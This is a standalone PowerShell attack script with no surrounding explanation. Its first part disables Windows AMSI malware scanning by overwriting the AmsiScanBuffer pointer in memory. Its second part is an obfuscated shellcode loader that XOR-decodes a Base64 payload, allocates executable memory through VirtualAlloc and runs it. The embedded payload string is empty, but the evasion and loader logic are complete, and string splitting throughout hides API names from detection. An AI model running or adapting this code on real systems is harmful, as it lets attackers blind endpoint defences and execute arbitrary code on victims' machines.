function MagicBypass {

    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    
    public class APIs {
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);
            
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);
            
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        
        // Dummy function that will replace AmsiScanBuffer
        public static int Dummy() {
            return 0;
        }
    }
"@

    $am = 'am' + 'si'
    $dll = $am + '.d' + 'll'
    $scanBuf = 'Am' + 'si' + 'Scan' + 'Bu' + 'ffer'
    
    $hModule = [APIs]::GetModuleHandle($dll)

    $amsiAddr = [APIs]::GetProcAddress($hModule, $scanBuf)
    

    $dummyMethodInfo = [APIs].GetMethod('Dummy')
    $dummyAddr = $dummyMethodInfo.MethodHandle.GetFunctionPointer()
    

    $asm = [AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.Location -like "*System.Management.Automation*" }
    
    $type = $asm.GetTypes() | 
        Where-Object { $_.Name -eq 'AmsiUtils' }
    
    $scanContent = $type.GetMethods('NonPublic, Static') | 
        Where-Object { $_.Name -eq 'ScanContent' }
    
    $scanAddr = $scanContent.MethodHandle.GetFunctionPointer()
    
    $initialStart = 0x50000
    $negativeOffset = 0x50000
    $readBytes = 0x50000
    $maxOffset = 0x1000000
    
    $hProcess = [APIs]::GetCurrentProcess()
    
    $found = $false
    $addrToCheck = $null
    $bytesRead = [IntPtr]::Zero
    
    for ($i = $initialStart; $i -lt $maxOffset; $i += $negativeOffset) {
        $startAddr = [IntPtr]::Subtract($scanAddr, $i)
        $buffer = New-Object byte[] $readBytes
        
        $success = [APIs]::ReadProcessMemory($hProcess, $startAddr, $buffer, $readBytes, [ref] $bytesRead)
        
        if (-not $success) { continue }
        
        for ($j = 0; $j -lt ($buffer.Length - 7); $j++) {
            $addr = [BitConverter]::ToInt64($buffer, $j)
            
            if ($addr -eq $amsiAddr.ToInt64()) {
                $found = $true
                $addrToCheck = [IntPtr]::Add($startAddr, $j)
                break
            }
        }
        
        if ($found) { break }
    }
    
    if (-not $found) {
        Write-Error "Could not find AmsiScanBuffer address."
        return
    }
    
    $bytesToWrite = [BitConverter]::GetBytes($dummyAddr.ToInt64())
    $bytesWritten = [IntPtr]::Zero
    
    $success = [APIs]::WriteProcessMemory($hProcess, $addrToCheck, $bytesToWrite, $bytesToWrite.Length, [ref] $bytesWritten)
    
    if ($success) {
        Write-Host "[+] AMSI bypassed successfully" -ForegroundColor Green
    } else {
        Write-Error "Failed to bypass AMSI"
    }
}

MagicBypass

Start-Sleep -Seconds 5;

Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$v_code = [System.Convert]::FromBase64String('')

	for ($specleet = 0; $specleet -lt $v_code.Count; $specleet++) {
		$v_code[$specleet] = $v_code[$specleet] -bxor 35
	}

	$k_mod = 'ker' + 'nel' + '32'
	$gmh_fn = 'Get' + 'Module' + 'HandleA'
	$gpa_fn = 'Get' + 'Proc' + 'Address'
	
	$rand_val = Get-Random -Minimum 100 -Maximum 999
	$rand_val = [math]::Sqrt($rand_val) * 0 + 1
	
	[Byte[]]$func_gmh = [BitConverter]::GetBytes((func_get_proc_address $k_mod $gmh_fn).ToInt64())
	[Byte[]]$func_gpa = [BitConverter]::GetBytes((func_get_proc_address $k_mod $gpa_fn).ToInt64())
	
	[Array]::Copy($func_gmh, 0, $v_code, 114929, $func_gmh.Length)
	[Array]::Copy($func_gpa, 0, $v_code, 114947, $func_gpa.Length)

	$m_type = 'Sy'+'stem.Runt'+'ime.Int'+'eropSer'+'vices.M'+'arshal'

	$alloc_func = 'Virt'+'ualAl'+'loc'
	
	$mem_addr = func_get_proc_address ($k_mod + '.dll') $alloc_func
	$mem_delegate_type = func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
	$alloc_delegate = (&([scriptblock]::Create("[$m_type]::GetDelegateForFunctionPointer(`$mem_addr, `$mem_delegate_type)")))

	$mem_size = $v_code.Length
	$mem_perms = 0x40  
	$mem_alloc_type = 0x3000 
	$mem_location = [IntPtr]::Zero
	
	$mem_buffer = $alloc_delegate.Invoke($mem_location, $mem_size, $mem_alloc_type, $mem_perms)

	$data_copy = (&([scriptblock]::Create("[$m_type]::Copy")))
	$data_copy.Invoke($v_code, 0, $mem_buffer, $v_code.length)

	$exec_type = func_get_delegate_type @([IntPtr]) ([Void])
	$shellcode_exec = (&([scriptblock]::Create("[$m_type]::GetDelegateForFunctionPointer(`$mem_buffer, `$exec_type)")))
	
	$param_zero = [IntPtr]::Zero
	$shellcode_exec.Invoke($param_zero)
}
